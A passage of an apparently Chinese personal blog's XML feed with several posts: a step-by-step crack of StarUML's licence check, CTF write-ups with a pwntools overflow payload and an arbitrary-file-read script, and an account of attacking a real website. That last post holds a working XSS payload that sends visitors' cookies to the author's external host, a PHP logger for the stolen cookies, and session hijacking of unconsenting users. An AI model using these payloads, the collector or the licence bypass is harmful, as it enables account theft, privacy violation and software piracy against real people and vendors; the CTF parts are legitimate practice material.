      <content type="html"><![CDATA[<p>StarUML 是一个方便的UML绘图工具，一直在使用这个，现在StarUML更新到了3.0，对弹窗做了很多的优化，现在支持了原始弹窗，和右键菜单，比以前的右键菜单好多了，但是未注册的导出的图片很尬尬，有水印，学生党什么的，肯定不能购买咯， :joy: ，话不多说，开始分析。</p><a id="more"></a><p><strong>仅供学习，就是为了去除水印，不要拿来干啥子</strong></p><h2 id="StarUML-2-绕过"><a href="#StarUML-2-绕过" class="headerlink" title="StarUML 2 绕过"></a>StarUML 2 绕过</h2><p>StarUML 使用的技术是 <code>Electorn</code> ，在 2.x 时代，程序都没打包，安装在程序目录下，具体是 <code>C:\Program Files (x86)\StarUML</code> ,这个是默认安装目录，破解方式很简单，找到授权验证的部分，修改下代码就好了，具体文件： <code>C:\Program Files (x86)\StarUML\www\license\node\LicenseManagerDomain.js</code> 目录相对于安装目录，文件修改地方就在20多行的验证函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">PK, name, product, licenseKey</span>)</span></span><br></pre></td></tr></table></figure><p>将原始函数修改为如下即可，内容随意，只要返回一个授权包即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">PK, name, product, licenseKey</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> &#123; </span><br><span class="line">            name: <span class="string">"DXkite"</span>, </span><br><span class="line">            product: <span class="string">"StarUML"</span>, </span><br><span class="line">            licenseType: <span class="string">"Personal"</span>,</span><br><span class="line">            quantity: <span class="string">"DXkite"</span>,</span><br><span class="line">            licenseKey: <span class="string">"DXkite Key"</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="StarUML3-绕过"><a href="#StarUML3-绕过" class="headerlink" title="StarUML3 绕过"></a>StarUML3 绕过</h2><p>现在升级到了 3.0 系统，整个系统的安装目录从C盘转到了用户数据文件夹，Windows 10的具体路径 <code>C:\Users\[用户名]\AppData\Local\Programs\StarUML</code></p><h3 id="解包-app-asar"><a href="#解包-app-asar" class="headerlink" title="解包 app.asar"></a>解包 app.asar</h3><p>我的路径为 <code>C:\Users\DXkite\AppData\Local\Programs\StarUML</code>，其中管理许可证书的文件在 <code>C:\Users\DXkite\AppData\Local\Programs\StarUML\resources\app.asar</code> 文件中，在这里使用 <code>asar</code> 命令解压 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install asar -g</span><br><span class="line">asar e app.asar app</span><br></pre></td></tr></table></figure><p>解压后可以发现目录下多了个<code>app</code>的文件夹。<strong>备份 <code>app.asar</code> 文件</strong> ，修改 <code>app</code> 文件夹中的文件 <code>C:\Users\DXkite\AppData\Local\Programs\StarUML\resources\app\src\engine\license-manager.js</code>找到验证函数 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">validate () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Local check</span></span><br><span class="line">        <span class="keyword">var</span> file = <span class="keyword">this</span>.findLicense()</span><br><span class="line">        <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">          reject(<span class="string">'License key not found'</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">var</span> data = fs.readFileSync(file, <span class="string">'utf8'</span>)</span><br><span class="line">          licenseInfo = <span class="built_in">JSON</span>.parse(data)</span><br><span class="line">          <span class="keyword">var</span> base = SK + licenseInfo.name +</span><br><span class="line">            SK + licenseInfo.product + <span class="string">'-'</span> + licenseInfo.licenseType +</span><br><span class="line">            SK + licenseInfo.quantity +</span><br><span class="line">            SK + licenseInfo.timestamp + SK</span><br><span class="line">          <span class="keyword">var</span> _key = crypto.createHash(<span class="string">'sha1'</span>).update(base).digest(<span class="string">'hex'</span>).toUpperCase()</span><br><span class="line">          <span class="keyword">if</span> (_key !== licenseInfo.licenseKey) &#123;</span><br><span class="line">            reject(<span class="string">'Invalid license key'</span>)</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Server check</span></span><br><span class="line">            $.post(app.config.validation_url, &#123;<span class="attr">licenseKey</span>: licenseInfo.licenseKey&#125;)</span><br><span class="line">              .done(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                resolve(data)</span><br><span class="line">              &#125;)</span><br><span class="line">              .fail(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err &amp;&amp; err.status === <span class="number">499</span>) &#123; <span class="comment">/*License key not exists*/</span></span><br><span class="line">                  reject(err)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">// If server is not available, assume that license key is valid</span></span><br><span class="line">                  resolve(licenseInfo)</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        reject(err)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>修改验证逻辑, 调用 <code>resolve</code> 方法，给定一个可用的许可，内容随意</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">validate () &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">resolve(&#123;</span><br><span class="line">name : <span class="string">"DXkite"</span>,</span><br><span class="line">product : <span class="string">"DXkite product"</span>,</span><br><span class="line">licenseType : <span class="string">"DXkite Personal"</span>,</span><br><span class="line">quantity : <span class="string">"DXkite Quantity"</span>,</span><br><span class="line">timestamp :<span class="string">"1529049036"</span>,</span><br><span class="line">&#125;);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="打包-app-文件夹"><a href="#打包-app-文件夹" class="headerlink" title="打包 app 文件夹"></a>打包 app 文件夹</h3><p>现在证书验证逻辑已经被修改了，我们所需要做的就是继续打包回去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asar p app app.asar</span><br></pre></td></tr></table></figure><p>打包回去以后你会发现你的StarUML3就被破解了。</p><blockquote><p>文章纯属记录，部分细节问题就没说，主要是破解程序还是不要太皮。有钱的可以买一个，我们程序员不容易</p></blockquote>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CISCN 2018 华中赛区 Q12</title>
      <link href="/2018/06/07/ciscn-center-zone-q12/"/>
      <url>/2018/06/07/ciscn-center-zone-q12/</url>
      <content type="html"><![CDATA[<p>第一次在CTF比赛中尝试解PWN题，先把PWN题的环境放上来，本次虚拟机环境情况为 Ubuntu 18.04 LTS，使用docker配置环境，后续会把整个题解出来</p><a id="more"></a><h2 id="CTF环境Docker复现"><a href="#CTF环境Docker复现" class="headerlink" title="CTF环境Docker复现"></a>CTF环境Docker复现</h2><p>本次复现使用 Docker 复现，保证环境可以正常运行，环境Docker原始文件下载：<a href="ciscn-12-docker.zip">ciscn-q12</a></p><h3 id="步骤1：安装Docker"><a href="#步骤1：安装Docker" class="headerlink" title="步骤1：安装Docker"></a>步骤1：安装Docker</h3><p>本次虚拟机环境情况为 Ubuntu 18.04 LTS，安装docker和docker-compose</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br></pre></td></tr></table></figure><p><img src="1.png" alt=""></p><h3 id="步骤2：运行Docker服务"><a href="#步骤2：运行Docker服务" class="headerlink" title="步骤2：运行Docker服务"></a>步骤2：运行Docker服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p><img src="ciscn-center-zone-q12/2.png" alt=""></p><h2 id="步骤3：构建Docker环境"><a href="#步骤3：构建Docker环境" class="headerlink" title="步骤3：构建Docker环境"></a>步骤3：构建Docker环境</h2><p>我们下载好Docker的环境：<a href="ciscn-12-docker.zip">ciscn-q12</a> 然后解压到环境根目录，打开终端，运行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker build -t pwn12 .</span><br></pre></td></tr></table></figure><p><img src="3.png" alt=""></p><h2 id="步骤4：运行Docker环境"><a href="#步骤4：运行Docker环境" class="headerlink" title="步骤4：运行Docker环境"></a>步骤4：运行Docker环境</h2><p>构建完成docker镜像后，运行环境，使用<code>docker ps</code>查看运行情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -d -p 1336:1336 pwn12</span><br><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure><p><img src="4.png" alt=""></p><p>从上图可以看到，我们的docker已经在监听 1337 号端口了。</p><h2 id="步骤5：运行不完全的Payload"><a href="#步骤5：运行不完全的Payload" class="headerlink" title="步骤5：运行不完全的Payload"></a>步骤5：运行不完全的Payload</h2><p>在比赛的时候我写了一个不完整的payload,只能加载部分的flag,为了验证环境是否安装完成，测试下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">'127.0.0.1'</span>,<span class="number">1337</span>)</span><br><span class="line">target = <span class="number">0x61616161</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span>*(<span class="number">0X1C</span>+<span class="number">8</span>)+p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="5.png" alt=""></p><p>从图可以看到我们读取了部分Flag</p><blockquote><p>根据出题人的意思，应该到这步就可以了的，但是由于未考虑到环境的FLAG长度，所以使本题目由签到题变成了入门题</p></blockquote>]]></content>
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CISCN 2018 华中赛区 Q03 题解</title>
      <link href="/2018/06/06/ciscn-center-zone-q03/"/>
      <url>/2018/06/06/ciscn-center-zone-q03/</url>
      <content type="html"><![CDATA[<h2 id="第一步：发现Cookie的漏洞：任意文件读取："><a href="#第一步：发现Cookie的漏洞：任意文件读取：" class="headerlink" title="第一步：发现Cookie的漏洞：任意文件读取："></a>第一步：发现Cookie的漏洞：任意文件读取：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CaptchaHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        file = open(self.application.jpgs_path + <span class="string">'/%s'</span> % base64.b64decode(self.get_cookie(<span class="string">'uuid'</span>)),<span class="string">'r'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'-'</span>*<span class="number">30</span></span><br><span class="line">        <span class="keyword">print</span> self.get_cookie(<span class="string">'uuid'</span>)</span><br><span class="line">        self.write(file.read())</span><br><span class="line">        file.close()</span><br><span class="line">        self.set_header(<span class="string">'Content-Type'</span>, <span class="string">'image/jpeg'</span>)</span><br></pre></td></tr></table></figure><p>在这个文件中的cookie中获取UUID并读取文件，并没有对日志目录进行过滤，所以这个地方造成了任意文件读取</p><a id="more"></a><h2 id="第二步：猜测Flag地址"><a href="#第二步：猜测Flag地址" class="headerlink" title="第二步：猜测Flag地址"></a>第二步：猜测Flag地址</h2><p>因为把整个源码Dump下来了，数据库和源码中都没有Flag的位置提示，后面侥幸猜测到了地址<code>/etc/flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://172.16.9.13/captcha'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(path)</span>:</span></span><br><span class="line">    </span><br><span class="line">    sess=req.session()</span><br><span class="line">    req.utils.add_dict_to_cookiejar(sess.cookies,&#123;</span><br><span class="line">        <span class="string">'_xsrf'</span>:<span class="string">'2|3e46911e|fabaf272f3f5acc81e80c3f2cbf64696|1527907652'</span>,</span><br><span class="line">        <span class="string">'uuid'</span>:<span class="string">'"'</span>+path.encode(<span class="string">'base64'</span>).strip()+<span class="string">'"'</span></span><br><span class="line">    &#125;) </span><br><span class="line">    res=sess.get(url)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    file= sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> read(file)</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>XSS注入Session Fixation攻击</title>
      <link href="/2016/07/23/xss-session-fixation/"/>
      <url>/2016/07/23/xss-session-fixation/</url>
      <content type="html"><![CDATA[<p>第一次实地操作web渗透？</p><a id="more"></a><p>啊哈哈，结果还是喜人的，附上Cookie登陆后的图：</p><p><img src="4031893413.png" alt="Cookie 登陆"></p><p>常规信息已经打码，本次web渗透的成功原因有两个</p><h2 id="1-XSS注入漏洞若干"><a href="#1-XSS注入漏洞若干" class="headerlink" title="1. XSS注入漏洞若干"></a>1. XSS注入漏洞若干</h2><p>为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，先贴测试脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> </span></span><br><span class="line"><span class="tag"><span class="attr">onerror</span>=<span class="string">"var s=document.createElement('script');</span></span></span><br><span class="line"><span class="tag"><span class="string">s.setAttribute('src','//safe.atd3.cn/a?b='+document.domain+'&amp;c='+document.cookie);</span></span></span><br><span class="line"><span class="tag"><span class="string">var b=document.all[0];</span></span></span><br><span class="line"><span class="tag"><span class="string">b.appendChild(s);</span></span></span><br><span class="line"><span class="tag"><span class="string">b.removeChild(s);</span></span></span><br><span class="line"><span class="tag"><span class="string">this.parentNode.removeChild(this);"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url<br>然后会调用<code>onerror</code>事件，在<code>onerror</code>事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的<code>cookie</code>和域名<br>反正这是我的一个简易后台代码,PHP做服务器端的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_name=<span class="string">'cookie.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists($file_name))</span><br><span class="line">file_put_contents($file_name,<span class="string">"&lt;?php \$a=[];\n"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'QUERY_STRING'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">file_put_contents($file_name,<span class="string">'$a[]=\''</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>].<span class="string">"';\n"</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，前期准备做好了，接下来开始注入测试，，，进入网站，，<br>直接插入一个简单的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">"console.log('xss');"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体—markdown编辑器来做示范吧,如图</p><p><img src="2242201383.png" alt="用Markdown编辑"></p><p>咳咳，，嗯，我顺带回答了问题，看看注入后的效果</p><p><img src="31655912.png" alt="注入脚本查看"></p><p>啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里</p><p><img src="1244653846.png" alt="唯一的痕迹"></p><p>然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子</p><p><img src="3364299923.png" alt="倒霉的小伙子"></p><p>侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，<br>接下来是第二个成功原因<code>session fixation</code>漏洞</p><h2 id="2-session-fixation-攻击"><a href="#2-session-fixation-攻击" class="headerlink" title="2. session fixation 攻击"></a>2. session fixation 攻击</h2><p>第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，<br>毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图</p><p><img src="/images/placeholder.png" alt="XSS防范" data-src="528666995.png" class="lazyload"></p><p>看图<code>HTTP</code>的红色标记，，这个是标记了<code>HttpOnly</code>的cookie，通过这个，我们用脚本<br><code>document.cookie</code>获取的cookie就不完整了，，，如图，，</p><p><img src="/images/placeholder.png" alt="脚本获取的cookie" data-src="2533359386.png" class="lazyload"></p><p>可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。<br>还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎<br>cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，</p><p><img src="/images/placeholder.png" alt="修改cookie" data-src="3441714176.png" class="lazyload"></p><p>通过抓包软件，抓到的数据包可以证明：</p><p><img src="/images/placeholder.png" alt="一个cookie的GET" data-src="3100487257.png" class="lazyload"></p><p>然后还有更无语的,那个我特么则怎么都获取不到的<code>HttpOnly</code>的cookie直接出现在了返回的包里，也是没得讲了</p><p><img src="/images/placeholder.png" alt="返回设置cookie" data-src="2520477158.png" class="lazyload"></p><p>就问傻不傻~！session fixation攻击，，？应该就是叫这个来着<br>咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，</p><p><img src="/images/placeholder.png" alt="返回的页面" data-src="1298714253.png" class="lazyload"></p><p>哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。<br>这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，<br>已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。<br>啊哈哈，好了，总结，，</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>在此次渗透过程中我使用了三种方式</p><ol><li>XSS 注入</li><li>session fixation 探测</li><li>iframe 劫持<br> 这个东西麽。网站对其有防范。。。就不截图了</li></ol><p>在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie<br>直接变成了未登陆状态，咳，还意外发现了这个：</p><p><img src="/images/placeholder.png" alt="百度的招聘" data-src="4207819758.png" class="lazyload"></p><p>所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个<code>F12</code>键，求职单就来了</p><blockquote><p>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为</p></blockquote><hr><p>刚刚又去看了下盗取的后台，尽管和网站负责人交流过过后，还是有部分脚本没删除干净，不过，怪我咯~</p><p><img src="/images/placeholder.png" alt="后台盗取的Cookie" data-src="2401380495.png" class="lazyload"><br><img src="/images/placeholder.png" alt="和负责人的交流" data-src="2350100276.png" class="lazyload"></p>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
            <tag> Session Fixation </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
